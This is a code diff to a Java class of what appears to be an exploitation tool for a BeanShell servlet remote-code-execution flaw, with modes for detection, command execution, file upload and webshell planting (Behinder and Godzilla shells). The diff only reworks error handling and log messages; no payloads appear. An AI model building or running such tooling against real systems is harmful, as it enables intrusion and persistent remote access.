@@ -36,7 +36,6 @@ public class BshServlet_RCE extends VulnBase {
             if (Config.MOD.equals("poc")) {
                 if (poc(vulnerable_url, "win")) {
                     logMessage("[+] BshServlet RCE 漏洞存在!");
-                    return;
                 } else {
                     if (poc(vulnerable_url, "linux")) {
                         logMessage("[+] BshServlet RCE 漏洞存在!");
@@ -44,38 +43,22 @@ public class BshServlet_RCE extends VulnBase {
                     } else {
                         logMessage("[-] BshServlet RCE 漏洞不存在. 请尝试手动利用.");
                     }
-                    return;
                 }
             } else if (Config.MOD.equals("exp")) {
-                if (exp(vulnerable_url)) {
-                    return;
-                } else {
-                    logMessage("[-] 一键 getshell 失败, 请尝试手动利用.");
-                }
-                return;
+                exp(vulnerable_url);
             } else if (Config.MOD.equals("exec")) {
-                if (exec(vulnerable_url, "win")) {
-                    return;
-                } else {
-                    if (exec(vulnerable_url, "linux")) {
-                        return;
-                    } else {
-                        logExec("[-] 执行失败, 请尝试手动利用.");
-                    }
+                if (!exec(vulnerable_url, "win")) {
+                    exec(vulnerable_url, "linux");
                 }
             } else if (Config.MOD.equals("upload")) {
-                if (upload(vulnerable_url)) {
-                    return;
-                } else {
-                    logUpload("[-] 文件上传失败, 请尝试手动利用.");
-                }
+                upload(vulnerable_url);
             } else {
                 throw new RuntimeException();
             }
 
 
         } catch (Exception e) {
-            logMessage(e.toString());
+
         }
     }
 
@@ -114,7 +97,7 @@ public class BshServlet_RCE extends VulnBase {
                 return false;
             }
         } catch (Exception e) {
-            logMessage(e.toString());
+            logMessage("[-] BshServlet RCE 漏洞不存在, 请尝试手动探测. " + e);
             return false;
         }
     }
@@ -165,7 +148,7 @@ public class BshServlet_RCE extends VulnBase {
                 return false;
             }
         } catch (Exception e) {
-            logExec(e.toString());
+            logExec("[-] 执行失败, 请尝试手动利用. " + e);
             return false;
         }
     }
@@ -207,13 +190,15 @@ public class BshServlet_RCE extends VulnBase {
                     logMessage("[+] webshell 写入成功! 同时写入回显/冰蝎/哥斯拉, 连接地址: " + Config.TARGET + "/" + filename + "\n[+] 请求头与连接密码见 README.md.");
                     return true;
                 } else {
+                    logMessage("[-] webshell 写入失败, 请尝试手动利用.");
                     return false;
                 }
             } else {
+                logMessage("[-] webshell 写入失败, 请尝试手动利用.");
                 return false;
             }
         } catch (Exception e) {
-            logMessage(e.toString());
+            logMessage("[-] webshell 写入失败, 请尝试手动利用." + e);
             return false;
         }
     }
@@ -255,13 +240,15 @@ public class BshServlet_RCE extends VulnBase {
                     logUpload("[+] 文件上传成功! 文件地址: " + Config.TARGET + "/" + fileName);
                     return true;
                 } else {
+                    logUpload("[-] 文件上传失败, 请尝试手动利用.");
                     return false;
                 }
             } else {
+                logUpload("[-] 文件上传失败, 请尝试手动利用.");
                 return false;
             }
         } catch (Exception e) {
-            logUpload(e.toString());
+            logUpload("[-] 文件上传失败, 请尝试手动利用." + e);
             return false;
         }
     }
